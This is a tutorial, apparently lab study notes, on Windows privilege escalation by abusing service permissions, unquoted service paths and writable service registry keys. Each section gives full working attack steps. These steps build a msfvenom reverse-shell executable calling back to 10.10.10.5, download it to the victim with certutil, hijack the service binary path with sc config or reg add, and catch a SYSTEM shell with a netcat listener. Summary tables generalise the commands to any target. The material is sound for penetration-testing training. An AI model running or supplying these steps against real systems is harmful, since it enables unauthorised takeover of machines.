## Privilege Escalation
Privilege escalation is gaining higher-level permissions than initially granted. In Windows, this typically means going from a normal user account to SYSTEM or Administrator. Common methods include exploiting misconfigured services, weak file permissions, or registry settings.

- You have low-level access (normal user)
- You want high-level access (administrator/SYSTEM)

**Why it matters:**
- Normal users can't install software
- Can't access sensitive files
- Can't modify system settings
- ==SYSTEM = highest privileges on Windows==
- Administrator = lower then SYSTEM but higher then an user

# 01: Service Exploits - Insecure Service Permissions
Modify a service that runs as SYSTEM

==**What are Windows Services?**==
- Programs that run in the background
- Start automatically when Windows boots
- Run with specific privileges (often SYSTEM)

==If YOU can modify/restart a service that runs as SYSTEM, you can run YOUR code as SYSTEM!==

### Step 1: Understanding Service Permissions
```
Normal Setup (Secure):
└── Service runs as SYSTEM
    └── Only Administrators can modify it ✅

Vulnerable Setup (Insecure):
└── Service runs as SYSTEM  
    └── Regular users can modify it ❌ EXPLOITABLE!
```

```
Service runs as SYSTEM
    ↓
You can modify service configuration
    ↓
Change service to run YOUR malicious code
    ↓
YOUR code runs as SYSTEM! 🎉
```
### Step 2: Finding Vulnerable Services
#### ==Tool 1: AccessChk (Sysinternals)==
(AccessChk = Permission Checker Tool
```
# Download accesschk.exe first or can be preinstalled
# Check service permissions for all users
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# Check specific service
accesschk.exe /accepteula -uwcqv daclsvc
```

**What to look for:**
```
SERVICE_ALL_ACCESS          ← You can do ANYTHING! 🚨
SERVICE_CHANGE_CONFIG       ← You can modify service 🚨
SERVICE_START               ← You can start service
SERVICE_STOP                ← You can stop service
```

#### Tool 2: PowerUp (PowerShell)
**PowerUp** = Automated Privilege Escalation Scanner
Think of it as a robot that automatically finds Windows privilege escalation vulnerabilities for you.
```
# Load PowerUp
. .\PowerUp.ps1

# Find all vulnerable services
Invoke-AllChecks

# Find services you can modify
Get-ModifiableService
```

#### Example: You find "daclsvc" service with full permissions

**DACL = Discretionary Access Control List**
daclsvc is NOT a real service on production Windows systems. It's a deliberately vulnerable service created for training purposes in cybersecurity labs.


##### Step 1: Check current service configuration
```
sc qc daclsvc
```

**Output shows:**
```
BINARY_PATH_NAME   : C:\Program Files\DACL Service\daclservice.exe
SERVICE_START_NAME : LocalSystem    ← Runs as SYSTEM!
```

##### Step 2: Create malicious payload
```bash
# On Kali Linux
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o rev.exe
```

##### Step 3: Transfer payload to victim
```
# Start HTTP server on Kali
python3 -m http.server 80

# On Windows victim
certutil -urlcache -f http://10.10.10.5/rev.exe C:\Temp\rev.exe
```

##### Step 4: Modify service to point to your payload
```
sc config daclsvc binpath= "C:\Temp\rev.exe"
```

##### Step 5: Start listener on Kali
```
nc -lvnp 4444
```

##### Step 6: Restart the service
```
# Stop service
net stop daclsvc

# Start service (runs YOUR code as SYSTEM!)
net start daclsvc
```

##### Step 7: Catch SYSTEM shell!
```
# On Kali, you now have shell as SYSTEM
C:\Windows\system32> whoami
nt authority\system
```


#### Short Summary

| Step | Command | What it does |
|---|---|---|
| 1. Find vulnerable services | `accesschk.exe -uwcqv "Users" *` | Lists services you can modify |
| 2. Check service details | `sc qc <service_name>` | Shows service configuration |
| 3. Create payload | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe` | Creates reverse shell |
| 4. Upload payload | `certutil -urlcache -f http://<IP>/shell.exe C:\Temp\shell.exe` | Downloads file to victim |
| 5. Modify service | `sc config <service> binpath= "C:\Temp\shell.exe"` | Points service to your shell |
| 6. Start listener | `nc -lvnp 4444` | Waits for connection |
| 7. Restart service | `net stop <service>` then `net start <service>` | Triggers your payload |


___

# 02: Service Exploits - Unquoted Service Path

**The Problem:**
Windows doesn't know where a file path with spaces ends if it's not in quotes!

Example:
```
C:\Program Files\My Service\service.exe
```

**Windows tries these paths in order:**
C:\Program.exe ❌
C:\Program Files\My.exe ❌
C:\Program Files\My Service\service.exe ✅

**If you can write to any of those locations, you can hijack the service!**

```
Quoted Path (Secure):
"C:\Program Files\My Service\service.exe"
└── Windows knows exactly where the file is ✅

Unquoted Path (Vulnerable):
C:\Program Files\My Service\service.exe
├── Try: C:\Program.exe
├── Try: C:\Program Files\My.exe
└── Try: C:\Program Files\My Service\service.exe

If you can create C:\Program.exe → YOUR code runs as SYSTEM! 🚨
```


## Finding Vulnerable Services

### Method 1: Manual Search
```powershell
# List all services with unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """"
```

### Method 2: PowerUp
```powershell 
. .\PowerUp.ps1
Get-UnquotedService
```

### Method 3: Using PowerShell
```powershell
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notmatch '^"' -and 
    $_.PathName -match ' ' -and 
    $_.StartMode -eq 'Auto'
} | Select-Object Name, DisplayName, PathName, StartName
```

## Exploitation Example
### Scenario: Found vulnerable service
```
# Check service details
sc qc unquotedsvc
```

**Output:**
```
BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
SERVICE_START_NAME : LocalSystem
START_TYPE         : 2 AUTO_START
```

**Attack paths to try (in order):**
- C:\Program.exe
- C:\Program Files\Unquoted.exe
- C:\Program Files\Unquoted Path Service\Common.exe

### Step-by-Step Exploitation
#### Step 1: Check write permissions
```
# Check if you can write to C:\Program Files\
accesschk.exe /accepteula -uwdq "C:\Program Files\"

# Check subdirectories
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

#### Step 2: Create malicious executable
```
# On Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o Common.exe
```

#### Step 3: Upload to vulnerable path
```
# Upload to writable location
certutil -urlcache -f http://10.10.10.5/Common.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

#### Step 4: Start listener
```
nc -lvnp 4444
```


#### Step 5: Restart service
```
# Need permissions to restart
net stop unquotedsvc
net start unquotedsvc
```

**Alternative:** Wait for system reboot (if service is AUTO_START)

## Summary

| Step | Command | Purpose |
|---|---|---|
| 1. Find unquoted paths | `wmic service get name,pathname,startmode \| findstr /i /v """"` | Lists services without quotes |
| 2. Check service details | `sc qc <service>` | Shows full path & privileges |
| 3. Check write permissions | `accesschk.exe -uwdq "<path>"` | Check if you can write to the folder |
| 4. Create payload | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o exploit.exe` | Creates malicious EXE payload |
| 5. Upload to path | `copy exploit.exe "C:\Program Files\Target.exe"` | Place payload in exploitable location |
| 6. Restart service | `net stop <service> & net start <service>` | Triggers payload execution |


___

#  03: Service Exploits - Weak Registry Permissions

Windows Registry = Database that stores system settings

Service settings stored in:

```
HKLM\System\CurrentControlSet\Services\<ServiceName>
```

**The Problem:**
If you can modify the registry key for a service, you can change what executable it runs!

## Understanding the Registry
### Registry Structure for Services
```
HKLM\System\CurrentControlSet\Services\
├── ServiceName
│   ├── ImagePath          ← Path to executable (TARGET!)
│   ├── ObjectName         ← Account it runs as
│   ├── Start              ← Startup type
│   └── Type               ← Service type
```

**Key Values:**

**ImagePath:** What program runs when service starts
**ObjectName:** Which user account runs it (LocalSystem = SYSTEM)


## Finding Vulnerable Registry Keys
#### Method 1: Using AccessChk
```
# Check registry permissions for all users
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services

# Check specific service
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

**Look for:**
```
KEY_ALL_ACCESS          ← Full control! 🚨
KEY_WRITE               ← Can modify! 🚨
```

#### Method 2: PowerUp
```
. .\PowerUp.ps1
Get-ModifiableServiceRegistry
```

## Example:
###  Found "regsvc" with weak registry permissions
#### Step 1: Verify vulnerability
```
# Check current service settings
sc qc regsvc

# Check registry permissions
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

**Output:**
```
RW NT AUTHORITY\INTERACTIVE    ← Logged-in users can WRITE! 🚨
```


#### Step 2: Check current ImagePath
```
reg query HKLM\System\CurrentControlSet\Services\regsvc /v ImagePath
```

**Output:**
```
ImagePath    REG_EXPAND_SZ    C:\Program Files\Vuln Service\service.exe
```

#### Step 3: Create malicious payload
```
# On Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o shell.exe
```

#### Step 4: Upload payload
```
certutil -urlcache -f http://10.10.10.5/shell.exe C:\Temp\shell.exe
```

#### Step 5: Modify ImagePath in registry
```
# Change registry to point to your shell
reg add HKLM\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\shell.exe" /f
```

#### Step 6: Start listener
```
nc -lvnp 4444
```

#### Step 7: Restart service
```
net stop regsvc
net start regsvc
```